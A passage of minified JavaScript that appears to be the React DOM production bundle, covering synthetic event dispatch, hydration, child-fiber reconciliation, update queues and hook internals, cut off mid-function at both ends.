d=i,u=nh(r),h=[];e:{var f=hg.get(t);if(f!==void 0){var m=ch,g=t;switch(t){case"keypress":if(Io(r)===0)break e;case"keydown":case"keyup":m=Pw;break;case"focusin":g="focus",m=Ac;break;case"focusout":g="blur",m=Ac;break;case"beforeblur":case"afterblur":m=Ac;break;case"click":if(r.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":m=Vf;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":m=yw;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":m=Iw;break;case lg:case cg:case dg:m=ww;break;case ug:m=Mw;break;case"scroll":m=gw;break;case"wheel":m=$w;break;case"copy":case"cut":case"paste":m=_w;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":m=Gf}var v=(e&4)!==0,w=!v&&t==="scroll",y=v?f!==null?f+"Capture":null:f;v=[];for(var x=d,b;x!==null;){b=x;var j=b.stateNode;if(b.tag===5&&j!==null&&(b=j,y!==null&&(j=fi(x,y),j!=null&&v.push(bi(x,j,b)))),w)break;x=x.return}0<v.length&&(f=new m(f,g,null,r,u),h.push({event:f,listeners:v}))}}if(!(e&7)){e:{if(f=t==="mouseover"||t==="pointerover",m=t==="mouseout"||t==="pointerout",f&&r!==Nd&&(g=r.relatedTarget||r.fromElement)&&(ns(g)||g[zr]))break e;if((m||f)&&(f=u.window===u?u:(f=u.ownerDocument)?f.defaultView||f.parentWindow:window,m?(g=r.relatedTarget||r.toElement,m=d,g=g?ns(g):null,g!==null&&(w=ws(g),g!==w||g.tag!==5&&g.tag!==6)&&(g=null)):(m=null,g=d),m!==g)){if(v=Vf,j="onMouseLeave",y="onMouseEnter",x="mouse",(t==="pointerout"||t==="pointerover")&&(v=Gf,j="onPointerLeave",y="onPointerEnter",x="pointer"),w=m==null?f:Fs(m),b=g==null?f:Fs(g),f=new v(j,x+"leave",m,r,u),f.target=w,f.relatedTarget=b,j=null,ns(u)===d&&(v=new v(y,x+"enter",g,r,u),v.target=b,v.relatedTarget=w,j=v),w=j,m&&g)t:{for(v=m,y=g,x=0,b=v;b;b=ks(b))x++;for(b=0,j=y;j;j=ks(j))b++;for(;0<x-b;)v=ks(v),x--;for(;0<b-x;)y=ks(y),b--;for(;x--;){if(v===y||y!==null&&v===y.alternate)break t;v=ks(v),y=ks(y)}v=null}else v=null;m!==null&&rm(h,f,m,v,!1),g!==null&&w!==null&&rm(h,w,g,v,!0)}}e:{if(f=d?Fs(d):window,m=f.nodeName&&f.nodeName.toLowerCase(),m==="select"||m==="input"&&f.type==="file")var _=Hw;else if(qf(f))if(ng)_=qw;else{_=Ww;var N=Gw}else(m=f.nodeName)&&m.toLowerCase()==="input"&&(f.type==="checkbox"||f.type==="radio")&&(_=Kw);if(_&&(_=_(t,d))){rg(h,_,r,u);break e}N&&N(t,f,d),t==="focusout"&&(N=f._wrapperState)&&N.controlled&&f.type==="number"&&vd(f,"number",f.value)}switch(N=d?Fs(d):window,t){case"focusin":(qf(N)||N.contentEditable==="true")&&(Ds=N,Ad=d,ni=null);break;case"focusout":ni=Ad=Ds=null;break;case"mousedown":Rd=!0;break;case"contextmenu":case"mouseup":case"dragend":Rd=!1,Zf(h,r,u);break;case"selectionchange":if(Jw)break;case"keydown":case"keyup":Zf(h,r,u)}var S;if(uh)e:{switch(t){case"compositionstart":var k="onCompositionStart";break e;case"compositionend":k="onCompositionEnd";break e;case"compositionupdate":k="onCompositionUpdate";break e}k=void 0}else Us?eg(t,r)&&(k="onCompositionEnd"):t==="keydown"&&r.keyCode===229&&(k="onCompositionStart");k&&(Zp&&r.locale!=="ko"&&(Us||k!=="onCompositionStart"?k==="onCompositionEnd"&&Us&&(S=Xp()):(dn=u,lh="value"in dn?dn.value:dn.textContent,Us=!0)),N=el(d,k),0<N.length&&(k=new Hf(k,t,null,r,u),h.push({event:k,listeners:N}),S?k.data=S:(S=tg(r),S!==null&&(k.data=S)))),(S=Dw?zw(t,r):Fw(t,r))&&(d=el(d,"onBeforeInput"),0<d.length&&(u=new Hf("onBeforeInput","beforeinput",null,r,u),h.push({event:u,listeners:d}),u.data=S))}fg(h,e)})}function bi(t,e,r){return{instance:t,listener:e,currentTarget:r}}function el(t,e){for(var r=e+"Capture",n=[];t!==null;){var s=t,i=s.stateNode;s.tag===5&&i!==null&&(s=i,i=fi(t,r),i!=null&&n.unshift(bi(t,i,s)),i=fi(t,e),i!=null&&n.push(bi(t,i,s))),t=t.return}return n}function ks(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5);return t||null}function rm(t,e,r,n,s){for(var i=e._reactName,o=[];r!==null&&r!==n;){var l=r,c=l.alternate,d=l.stateNode;if(c!==null&&c===n)break;l.tag===5&&d!==null&&(l=d,s?(c=fi(r,i),c!=null&&o.unshift(bi(r,c,l))):s||(c=fi(r,i),c!=null&&o.push(bi(r,c,l)))),r=r.return}o.length!==0&&t.push({event:e,listeners:o})}var t1=/\r\n?/g,r1=/\u0000|\uFFFD/g;function nm(t){return(typeof t=="string"?t:""+t).replace(t1,`
`).replace(r1,"")}function fo(t,e,r){if(e=nm(e),nm(t)!==e&&r)throw Error(D(425))}function tl(){}var Id=null,Ld=null;function Md(t,e){return t==="textarea"||t==="noscript"||typeof e.children=="string"||typeof e.children=="number"||typeof e.dangerouslySetInnerHTML=="object"&&e.dangerouslySetInnerHTML!==null&&e.dangerouslySetInnerHTML.__html!=null}var Od=typeof setTimeout=="function"?setTimeout:void 0,n1=typeof clearTimeout=="function"?clearTimeout:void 0,sm=typeof Promise=="function"?Promise:void 0,s1=typeof queueMicrotask=="function"?queueMicrotask:typeof sm<"u"?function(t){return sm.resolve(null).then(t).catch(a1)}:Od;function a1(t){setTimeout(function(){throw t})}function Dc(t,e){var r=e,n=0;do{var s=r.nextSibling;if(t.removeChild(r),s&&s.nodeType===8)if(r=s.data,r==="/$"){if(n===0){t.removeChild(s),gi(e);return}n--}else r!=="$"&&r!=="$?"&&r!=="$!"||n++;r=s}while(r);gi(e)}function gn(t){for(;t!=null;t=t.nextSibling){var e=t.nodeType;if(e===1||e===3)break;if(e===8){if(e=t.data,e==="$"||e==="$!"||e==="$?")break;if(e==="/$")return null}}return t}function am(t){t=t.previousSibling;for(var e=0;t;){if(t.nodeType===8){var r=t.data;if(r==="$"||r==="$!"||r==="$?"){if(e===0)return t;e--}else r==="/$"&&e++}t=t.previousSibling}return null}var Ca=Math.random().toString(36).slice(2),_r="__reactFiber$"+Ca,wi="__reactProps$"+Ca,zr="__reactContainer$"+Ca,$d="__reactEvents$"+Ca,i1="__reactListeners$"+Ca,o1="__reactHandles$"+Ca;function ns(t){var e=t[_r];if(e)return e;for(var r=t.parentNode;r;){if(e=r[zr]||r[_r]){if(r=e.alternate,e.child!==null||r!==null&&r.child!==null)for(t=am(t);t!==null;){if(r=t[_r])return r;t=am(t)}return e}t=r,r=t.parentNode}return null}function Ki(t){return t=t[_r]||t[zr],!t||t.tag!==5&&t.tag!==6&&t.tag!==13&&t.tag!==3?null:t}function Fs(t){if(t.tag===5||t.tag===6)return t.stateNode;throw Error(D(33))}function Ul(t){return t[wi]||null}var Ud=[],Bs=-1;function Rn(t){return{current:t}}function Re(t){0>Bs||(t.current=Ud[Bs],Ud[Bs]=null,Bs--)}function Ce(t,e){Bs++,Ud[Bs]=t.current,t.current=e}var jn={},dt=Rn(jn),jt=Rn(!1),ms=jn;function ma(t,e){var r=t.type.contextTypes;if(!r)return jn;var n=t.stateNode;if(n&&n.__reactInternalMemoizedUnmaskedChildContext===e)return n.__reactInternalMemoizedMaskedChildContext;var s={},i;for(i in r)s[i]=e[i];return n&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=e,t.__reactInternalMemoizedMaskedChildContext=s),s}function _t(t){return t=t.childContextTypes,t!=null}function rl(){Re(jt),Re(dt)}function im(t,e,r){if(dt.current!==jn)throw Error(D(168));Ce(dt,e),Ce(jt,r)}function pg(t,e,r){var n=t.stateNode;if(e=e.childContextTypes,typeof n.getChildContext!="function")return r;n=n.getChildContext();for(var s in n)if(!(s in e))throw Error(D(108,Gb(t)||"Unknown",s));return Oe({},r,n)}function nl(t){return t=(t=t.stateNode)&&t.__reactInternalMemoizedMergedChildContext||jn,ms=dt.current,Ce(dt,t),Ce(jt,jt.current),!0}function om(t,e,r){var n=t.stateNode;if(!n)throw Error(D(169));r?(t=pg(t,e,ms),n.__reactInternalMemoizedMergedChildContext=t,Re(jt),Re(dt),Ce(dt,t)):Re(jt),Ce(jt,r)}var Lr=null,Dl=!1,zc=!1;function gg(t){Lr===null?Lr=[t]:Lr.push(t)}function l1(t){Dl=!0,gg(t)}function In(){if(!zc&&Lr!==null){zc=!0;var t=0,e=je;try{var r=Lr;for(je=1;t<r.length;t++){var n=r[t];do n=n(!0);while(n!==null)}Lr=null,Dl=!1}catch(s){throw Lr!==null&&(Lr=Lr.slice(t+1)),Fp(sh,In),s}finally{je=e,zc=!1}}return null}var Vs=[],Hs=0,sl=null,al=0,zt=[],Ft=0,ps=null,Mr=1,Or="";function Bn(t,e){Vs[Hs++]=al,Vs[Hs++]=sl,sl=t,al=e}function xg(t,e,r){zt[Ft++]=Mr,zt[Ft++]=Or,zt[Ft++]=ps,ps=t;var n=Mr;t=Or;var s=32-or(n)-1;n&=~(1<<s),r+=1;var i=32-or(e)+s;if(30<i){var o=s-s%5;i=(n&(1<<o)-1).toString(32),n>>=o,s-=o,Mr=1<<32-or(e)+s|r<<s|n,Or=i+t}else Mr=1<<i|r<<s|n,Or=t}function fh(t){t.return!==null&&(Bn(t,1),xg(t,1,0))}function mh(t){for(;t===sl;)sl=Vs[--Hs],Vs[Hs]=null,al=Vs[--Hs],Vs[Hs]=null;for(;t===ps;)ps=zt[--Ft],zt[Ft]=null,Or=zt[--Ft],zt[Ft]=null,Mr=zt[--Ft],zt[Ft]=null}var At=null,Pt=null,Ie=!1,sr=null;function yg(t,e){var r=Gt(5,null,null,0);r.elementType="DELETED",r.stateNode=e,r.return=t,e=t.deletions,e===null?(t.deletions=[r],t.flags|=16):e.push(r)}function lm(t,e){switch(t.tag){case 5:var r=t.type;return e=e.nodeType!==1||r.toLowerCase()!==e.nodeName.toLowerCase()?null:e,e!==null?(t.stateNode=e,At=t,Pt=gn(e.firstChild),!0):!1;case 6:return e=t.pendingProps===""||e.nodeType!==3?null:e,e!==null?(t.stateNode=e,At=t,Pt=null,!0):!1;case 13:return e=e.nodeType!==8?null:e,e!==null?(r=ps!==null?{id:Mr,overflow:Or}:null,t.memoizedState={dehydrated:e,treeContext:r,retryLane:1073741824},r=Gt(18,null,null,0),r.stateNode=e,r.return=t,t.child=r,At=t,Pt=null,!0):!1;default:return!1}}function Dd(t){return(t.mode&1)!==0&&(t.flags&128)===0}function zd(t){if(Ie){var e=Pt;if(e){var r=e;if(!lm(t,e)){if(Dd(t))throw Error(D(418));e=gn(r.nextSibling);var n=At;e&&lm(t,e)?yg(n,r):(t.flags=t.flags&-4097|2,Ie=!1,At=t)}}else{if(Dd(t))throw Error(D(418));t.flags=t.flags&-4097|2,Ie=!1,At=t}}}function cm(t){for(t=t.return;t!==null&&t.tag!==5&&t.tag!==3&&t.tag!==13;)t=t.return;At=t}function mo(t){if(t!==At)return!1;if(!Ie)return cm(t),Ie=!0,!1;var e;if((e=t.tag!==3)&&!(e=t.tag!==5)&&(e=t.type,e=e!=="head"&&e!=="body"&&!Md(t.type,t.memoizedProps)),e&&(e=Pt)){if(Dd(t))throw vg(),Error(D(418));for(;e;)yg(t,e),e=gn(e.nextSibling)}if(cm(t),t.tag===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(D(317));e:{for(t=t.nextSibling,e=0;t;){if(t.nodeType===8){var r=t.data;if(r==="/$"){if(e===0){Pt=gn(t.nextSibling);break e}e--}else r!=="$"&&r!=="$!"&&r!=="$?"||e++}t=t.nextSibling}Pt=null}}else Pt=At?gn(t.stateNode.nextSibling):null;return!0}function vg(){for(var t=Pt;t;)t=gn(t.nextSibling)}function pa(){Pt=At=null,Ie=!1}function ph(t){sr===null?sr=[t]:sr.push(t)}var c1=Gr.ReactCurrentBatchConfig;function Fa(t,e,r){if(t=r.ref,t!==null&&typeof t!="function"&&typeof t!="object"){if(r._owner){if(r=r._owner,r){if(r.tag!==1)throw Error(D(309));var n=r.stateNode}if(!n)throw Error(D(147,t));var s=n,i=""+t;return e!==null&&e.ref!==null&&typeof e.ref=="function"&&e.ref._stringRef===i?e.ref:(e=function(o){var l=s.refs;o===null?delete l[i]:l[i]=o},e._stringRef=i,e)}if(typeof t!="string")throw Error(D(284));if(!r._owner)throw Error(D(290,t))}return t}function po(t,e){throw t=Object.prototype.toString.call(e),Error(D(31,t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t))}function dm(t){var e=t._init;return e(t._payload)}function bg(t){function e(y,x){if(t){var b=y.deletions;b===null?(y.deletions=[x],y.flags|=16):b.push(x)}}function r(y,x){if(!t)return null;for(;x!==null;)e(y,x),x=x.sibling;return null}function n(y,x){for(y=new Map;x!==null;)x.key!==null?y.set(x.key,x):y.set(x.index,x),x=x.sibling;return y}function s(y,x){return y=bn(y,x),y.index=0,y.sibling=null,y}function i(y,x,b){return y.index=b,t?(b=y.alternate,b!==null?(b=b.index,b<x?(y.flags|=2,x):b):(y.flags|=2,x)):(y.flags|=1048576,x)}function o(y){return t&&y.alternate===null&&(y.flags|=2),y}function l(y,x,b,j){return x===null||x.tag!==6?(x=Kc(b,y.mode,j),x.return=y,x):(x=s(x,b),x.return=y,x)}function c(y,x,b,j){var _=b.type;return _===$s?u(y,x,b.props.children,j,b.key):x!==null&&(x.elementType===_||typeof _=="object"&&_!==null&&_.$$typeof===Zr&&dm(_)===x.type)?(j=s(x,b.props),j.ref=Fa(y,x,b),j.return=y,j):(j=zo(b.type,b.key,b.props,null,y.mode,j),j.ref=Fa(y,x,b),j.return=y,j)}function d(y,x,b,j){return x===null||x.tag!==4||x.stateNode.containerInfo!==b.containerInfo||x.stateNode.implementation!==b.implementation?(x=qc(b,y.mode,j),x.return=y,x):(x=s(x,b.children||[]),x.return=y,x)}function u(y,x,b,j,_){return x===null||x.tag!==7?(x=hs(b,y.mode,j,_),x.return=y,x):(x=s(x,b),x.return=y,x)}function h(y,x,b){if(typeof x=="string"&&x!==""||typeof x=="number")return x=Kc(""+x,y.mode,b),x.return=y,x;if(typeof x=="object"&&x!==null){switch(x.$$typeof){case no:return b=zo(x.type,x.key,x.props,null,y.mode,b),b.ref=Fa(y,null,x),b.return=y,b;case Os:return x=qc(x,y.mode,b),x.return=y,x;case Zr:var j=x._init;return h(y,j(x._payload),b)}if(Qa(x)||Oa(x))return x=hs(x,y.mode,b,null),x.return=y,x;po(y,x)}return null}function f(y,x,b,j){var _=x!==null?x.key:null;if(typeof b=="string"&&b!==""||typeof b=="number")return _!==null?null:l(y,x,""+b,j);if(typeof b=="object"&&b!==null){switch(b.$$typeof){case no:return b.key===_?c(y,x,b,j):null;case Os:return b.key===_?d(y,x,b,j):null;case Zr:return _=b._init,f(y,x,_(b._payload),j)}if(Qa(b)||Oa(b))return _!==null?null:u(y,x,b,j,null);po(y,b)}return null}function m(y,x,b,j,_){if(typeof j=="string"&&j!==""||typeof j=="number")return y=y.get(b)||null,l(x,y,""+j,_);if(typeof j=="object"&&j!==null){switch(j.$$typeof){case no:return y=y.get(j.key===null?b:j.key)||null,c(x,y,j,_);case Os:return y=y.get(j.key===null?b:j.key)||null,d(x,y,j,_);case Zr:var N=j._init;return m(y,x,b,N(j._payload),_)}if(Qa(j)||Oa(j))return y=y.get(b)||null,u(x,y,j,_,null);po(x,j)}return null}function g(y,x,b,j){for(var _=null,N=null,S=x,k=x=0,C=null;S!==null&&k<b.length;k++){S.index>k?(C=S,S=null):C=S.sibling;var T=f(y,S,b[k],j);if(T===null){S===null&&(S=C);break}t&&S&&T.alternate===null&&e(y,S),x=i(T,x,k),N===null?_=T:N.sibling=T,N=T,S=C}if(k===b.length)return r(y,S),Ie&&Bn(y,k),_;if(S===null){for(;k<b.length;k++)S=h(y,b[k],j),S!==null&&(x=i(S,x,k),N===null?_=S:N.sibling=S,N=S);return Ie&&Bn(y,k),_}for(S=n(y,S);k<b.length;k++)C=m(S,y,k,b[k],j),C!==null&&(t&&C.alternate!==null&&S.delete(C.key===null?k:C.key),x=i(C,x,k),N===null?_=C:N.sibling=C,N=C);return t&&S.forEach(function(M){return e(y,M)}),Ie&&Bn(y,k),_}function v(y,x,b,j){var _=Oa(b);if(typeof _!="function")throw Error(D(150));if(b=_.call(b),b==null)throw Error(D(151));for(var N=_=null,S=x,k=x=0,C=null,T=b.next();S!==null&&!T.done;k++,T=b.next()){S.index>k?(C=S,S=null):C=S.sibling;var M=f(y,S,T.value,j);if(M===null){S===null&&(S=C);break}t&&S&&M.alternate===null&&e(y,S),x=i(M,x,k),N===null?_=M:N.sibling=M,N=M,S=C}if(T.done)return r(y,S),Ie&&Bn(y,k),_;if(S===null){for(;!T.done;k++,T=b.next())T=h(y,T.value,j),T!==null&&(x=i(T,x,k),N===null?_=T:N.sibling=T,N=T);return Ie&&Bn(y,k),_}for(S=n(y,S);!T.done;k++,T=b.next())T=m(S,y,k,T.value,j),T!==null&&(t&&T.alternate!==null&&S.delete(T.key===null?k:T.key),x=i(T,x,k),N===null?_=T:N.sibling=T,N=T);return t&&S.forEach(function(A){return e(y,A)}),Ie&&Bn(y,k),_}function w(y,x,b,j){if(typeof b=="object"&&b!==null&&b.type===$s&&b.key===null&&(b=b.props.children),typeof b=="object"&&b!==null){switch(b.$$typeof){case no:e:{for(var _=b.key,N=x;N!==null;){if(N.key===_){if(_=b.type,_===$s){if(N.tag===7){r(y,N.sibling),x=s(N,b.props.children),x.return=y,y=x;break e}}else if(N.elementType===_||typeof _=="object"&&_!==null&&_.$$typeof===Zr&&dm(_)===N.type){r(y,N.sibling),x=s(N,b.props),x.ref=Fa(y,N,b),x.return=y,y=x;break e}r(y,N);break}else e(y,N);N=N.sibling}b.type===$s?(x=hs(b.props.children,y.mode,j,b.key),x.return=y,y=x):(j=zo(b.type,b.key,b.props,null,y.mode,j),j.ref=Fa(y,x,b),j.return=y,y=j)}return o(y);case Os:e:{for(N=b.key;x!==null;){if(x.key===N)if(x.tag===4&&x.stateNode.containerInfo===b.containerInfo&&x.stateNode.implementation===b.implementation){r(y,x.sibling),x=s(x,b.children||[]),x.return=y,y=x;break e}else{r(y,x);break}else e(y,x);x=x.sibling}x=qc(b,y.mode,j),x.return=y,y=x}return o(y);case Zr:return N=b._init,w(y,x,N(b._payload),j)}if(Qa(b))return g(y,x,b,j);if(Oa(b))return v(y,x,b,j);po(y,b)}return typeof b=="string"&&b!==""||typeof b=="number"?(b=""+b,x!==null&&x.tag===6?(r(y,x.sibling),x=s(x,b),x.return=y,y=x):(r(y,x),x=Kc(b,y.mode,j),x.return=y,y=x),o(y)):r(y,x)}return w}var ga=bg(!0),wg=bg(!1),il=Rn(null),ol=null,Gs=null,gh=null;function xh(){gh=Gs=ol=null}function yh(t){var e=il.current;Re(il),t._currentValue=e}function Fd(t,e,r){for(;t!==null;){var n=t.alternate;if((t.childLanes&e)!==e?(t.childLanes|=e,n!==null&&(n.childLanes|=e)):n!==null&&(n.childLanes&e)!==e&&(n.childLanes|=e),t===r)break;t=t.return}}function Zs(t,e){ol=t,gh=Gs=null,t=t.dependencies,t!==null&&t.firstContext!==null&&(t.lanes&e&&(wt=!0),t.firstContext=null)}function qt(t){var e=t._currentValue;if(gh!==t)if(t={context:t,memoizedValue:e,next:null},Gs===null){if(ol===null)throw Error(D(308));Gs=t,ol.dependencies={lanes:0,firstContext:t}}else Gs=Gs.next=t;return e}var ss=null;function vh(t){ss===null?ss=[t]:ss.push(t)}function jg(t,e,r,n){var s=e.interleaved;return s===null?(r.next=r,vh(e)):(r.next=s.next,s.next=r),e.interleaved=r,Fr(t,n)}function Fr(t,e){t.lanes|=e;var r=t.alternate;for(r!==null&&(r.lanes|=e),r=t,t=t.return;t!==null;)t.childLanes|=e,r=t.alternate,r!==null&&(r.childLanes|=e),r=t,t=t.return;return r.tag===3?r.stateNode:null}var en=!1;function bh(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function _g(t,e){t=t.updateQueue,e.updateQueue===t&&(e.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,effects:t.effects})}function $r(t,e){return{eventTime:t,lane:e,tag:0,payload:null,callback:null,next:null}}function xn(t,e,r){var n=t.updateQueue;if(n===null)return null;if(n=n.shared,xe&2){var s=n.pending;return s===null?e.next=e:(e.next=s.next,s.next=e),n.pending=e,Fr(t,r)}return s=n.interleaved,s===null?(e.next=e,vh(n)):(e.next=s.next,s.next=e),n.interleaved=e,Fr(t,r)}function Lo(t,e,r){if(e=e.updateQueue,e!==null&&(e=e.shared,(r&4194240)!==0)){var n=e.lanes;n&=t.pendingLanes,r|=n,e.lanes=r,ah(t,r)}}function um(t,e){var r=t.updateQueue,n=t.alternate;if(n!==null&&(n=n.updateQueue,r===n)){var s=null,i=null;if(r=r.firstBaseUpdate,r!==null){do{var o={eventTime:r.eventTime,lane:r.lane,tag:r.tag,payload:r.payload,callback:r.callback,next:null};i===null?s=i=o:i=i.next=o,r=r.next}while(r!==null);i===null?s=i=e:i=i.next=e}else s=i=e;r={baseState:n.baseState,firstBaseUpdate:s,lastBaseUpdate:i,shared:n.shared,effects:n.effects},t.updateQueue=r;return}t=r.lastBaseUpdate,t===null?r.firstBaseUpdate=e:t.next=e,r.lastBaseUpdate=e}function ll(t,e,r,n){var s=t.updateQueue;en=!1;var i=s.firstBaseUpdate,o=s.lastBaseUpdate,l=s.shared.pending;if(l!==null){s.shared.pending=null;var c=l,d=c.next;c.next=null,o===null?i=d:o.next=d,o=c;var u=t.alternate;u!==null&&(u=u.updateQueue,l=u.lastBaseUpdate,l!==o&&(l===null?u.firstBaseUpdate=d:l.next=d,u.lastBaseUpdate=c))}if(i!==null){var h=s.baseState;o=0,u=d=c=null,l=i;do{var f=l.lane,m=l.eventTime;if((n&f)===f){u!==null&&(u=u.next={eventTime:m,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var g=t,v=l;switch(f=e,m=r,v.tag){case 1:if(g=v.payload,typeof g=="function"){h=g.call(m,h,f);break e}h=g;break e;case 3:g.flags=g.flags&-65537|128;case 0:if(g=v.payload,f=typeof g=="function"?g.call(m,h,f):g,f==null)break e;h=Oe({},h,f);break e;case 2:en=!0}}l.callback!==null&&l.lane!==0&&(t.flags|=64,f=s.effects,f===null?s.effects=[l]:f.push(l))}else m={eventTime:m,lane:f,tag:l.tag,payload:l.payload,callback:l.callback,next:null},u===null?(d=u=m,c=h):u=u.next=m,o|=f;if(l=l.next,l===null){if(l=s.shared.pending,l===null)break;f=l,l=f.next,f.next=null,s.lastBaseUpdate=f,s.shared.pending=null}}while(!0);if(u===null&&(c=h),s.baseState=c,s.firstBaseUpdate=d,s.lastBaseUpdate=u,e=s.shared.interleaved,e!==null){s=e;do o|=s.lane,s=s.next;while(s!==e)}else i===null&&(s.shared.lanes=0);xs|=o,t.lanes=o,t.memoizedState=h}}function hm(t,e,r){if(t=e.effects,e.effects=null,t!==null)for(e=0;e<t.length;e++){var n=t[e],s=n.callback;if(s!==null){if(n.callback=null,n=r,typeof s!="function")throw Error(D(191,s));s.call(n)}}}var qi={},Sr=Rn(qi),ji=Rn(qi),_i=Rn(qi);function as(t){if(t===qi)throw Error(D(174));return t}function wh(t,e){switch(Ce(_i,e),Ce(ji,t),Ce(Sr,qi),t=e.nodeType,t){case 9:case 11:e=(e=e.documentElement)?e.namespaceURI:wd(null,"");break;default:t=t===8?e.parentNode:e,e=t.namespaceURI||null,t=t.tagName,e=wd(e,t)}Re(Sr),Ce(Sr,e)}function xa(){Re(Sr),Re(ji),Re(_i)}function Ng(t){as(_i.current);var e=as(Sr.current),r=wd(e,t.type);e!==r&&(Ce(ji,t),Ce(Sr,r))}function jh(t){ji.current===t&&(Re(Sr),Re(ji))}var Le=Rn(0);function cl(t){for(var e=t;e!==null;){if(e.tag===13){var r=e.memoizedState;if(r!==null&&(r=r.dehydrated,r===null||r.data==="$?"||r.data==="$!"))return e}else if(e.tag===19&&e.memoizedProps.revealOrder!==void 0){if(e.flags&128)return e}else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}return null}var Fc=[];function _h(){for(var t=0;t<Fc.length;t++)Fc[t]._workInProgressVersionPrimary=null;Fc.length=0}var Mo=Gr.ReactCurrentDispatcher,Bc=Gr.ReactCurrentBatchConfig,gs=0,Me=null,Ve=null,qe=null,dl=!1,si=!1,Ni=0,d1=0;function nt(){throw Error(D(321))}function Nh(t,e){if(e===null)return!1;for(var r=0;r<e.length&&r<t.length;r++)if(!dr(t[r],e[r]))return!1;return!0}function Sh(t,e,r,n,s,i){if(gs=i,Me=e,e.memoizedState=null,e.updateQueue=null,e.lanes=0,Mo.current=t===null||t.memoizedState===null?m1:p1,t=r(n,s),si){i=0;do{if(si=!1,Ni=0,25<=i)throw Error(D(301));i+=1,qe=Ve=null,e.updateQueue=null,Mo.current=g1,t=r(n,s)}while(si)}if(Mo.current=ul,e=Ve!==null&&Ve.next!==null,gs=0,qe=Ve=Me=null,dl=!1,e)throw Error(D(300));return t}function kh(){var t=Ni!==0;return Ni=0,t}function yr(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return qe===null?Me.memoizedState=qe=t:qe=qe.next=t,qe}function Qt(){if(Ve===null){var t=Me.alternate;t=t!==null?t.memoizedState:null}else t=Ve.next;var e=qe===null?Me.memoizedState:qe.next;if(e!==null)qe=e,Ve=t;else{if(t===null)throw Error(D(310));Ve=t,t={memoizedState:Ve.memoizedState,baseState:Ve.baseState,baseQueue:Ve.baseQueue,queue:Ve.queue,next:null},qe===null?Me.memoizedState=qe=t:qe=qe.next=t}return qe}function Si(t,e){return typeof e=="function"?e(t):e}function Vc(t){var e=Qt(),r=e.queue;if(r===null)throw Error(D(311));r.lastRenderedReducer=t;var n=Ve,s=n.baseQueue,i=r.pending;if(i!==null){if(s!==null){var o=s.next;s.next=i.next,i.next=o}n.baseQueue=s=i,r.pending=null}if(s!==null){i=s.next,n=n.baseState;var l=o=null,c=null,d=i;do{var u=d.lane;if((gs&u)===u)c!==null&&(c=c.next={lane:0,action:d.action,hasEagerState:d.hasEagerState,eagerState:d.eagerState,next:null}),n=d.hasEagerState?d.eagerState:t(n,d.action);else{var h={lane:u,action:d.action,hasEagerState:d.hasEagerState,eagerState:d.eagerState,next:null};c===null?(l=c=h,o=n):c=c.next=h,Me.lanes|=u,xs|=u}d=d.next}while(d!==null&&d!==i);c===null?o=n:c.next=l,dr(n,e.memoizedState)||(wt=!0),e.memoizedState=n,e.baseState=o,e.baseQueue=c,r.lastRenderedState=n}if(t=r.interleaved,t!==null){s=t;do i=s.lane,Me.lanes|=i,xs|=i,s=s.next;while(s!==t)}else s===null&&(r.lanes=0);return[e.memoizedState,r.dispatch]}function Hc(t){var e=Qt(),r=e.queue;if(r===null)throw Error(D(311));r.lastRenderedReducer=t;var n=r.dispatch,s=r.pending,i=e.memoizedState;if(s!==null){r.pending=null;var o=s=s.next;do i=t(i,o.action),o=o.next;while(o!==s);dr(i,e.memoizedState)||(wt=!0),e.memoizedState=i,e.baseQueue===null&&(e.baseState=i),r.lastRenderedState=i}return[i,n]}function Sg(){}function kg(t,e){var r=Me,n=Qt(),s=e(),i=!dr(n.memoizedState,s);if(i&&(n.memoizedState=s,wt=!0),n=n.queue,Eh(Tg.bind(null,r,n,t),[t]),n.getSnapshot!==e||i||qe!==null&&qe.memoizedState.tag&1){if(r.flags|=2048,ki(9,Cg.bind(null,r,n,s,e),void 0,null),Qe===null)throw Error(D(349));gs&30||Eg(r,e,s)}return s}function Eg(t,e,r){t.flags|=16384,t={getSnapshot:e,value:r},e=Me.updateQueue,e===null?(e={lastEffect:null,stores:null},Me.updateQueue=e,e.stores=[t]):(r=e.stores,r===null?e.stores=[t]:r.push(t))}function Cg(t,e,r,n){e.value=r,e.getSnapshot=n,Pg(e)&&Ag(t)}function Tg(t,e,r){return r(function(){Pg(e)&&Ag(t)})}function Pg(t){var e=t.getSnapshot;t=t.value;try{var r=e();return!dr(t,r)}catch{return!0}}function Ag(t){var e=Fr(t,1);e!==null&&lr(e,t,1,-1)}function fm(t){var e=yr();return typeof t=="function"&&(t=t()),e.memoizedState=e.baseState=t,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Si,lastRenderedState:t},e.queue=t,t=t.dispatch=f1.bind(null,Me,t),[e.memoizedState,t]}function ki(t,e,r,n){return t={tag:t,create:e,destroy:r,deps:n,next:null},e=Me.updateQueue,e===null?(e={lastEffect:null,stores:null},Me.updateQueue=e,e.lastEffect=t.next=t):(r=e.lastEffect,r===null?e.lastEffect=t.next=t:(n=r.next,r.next=t,t.next=n,e.lastEffect=t)),t}function Rg(){return Qt().memoizedState}function Oo(t,e,r,n){var s=yr();Me.flags|=t,s.memoizedState=ki(1|e,r,void 0,n===void 0?null:n)}function zl(t,e,r,n){var s=Qt();n=n===void 0?null:n;var i=void 0;if(Ve!==null){var 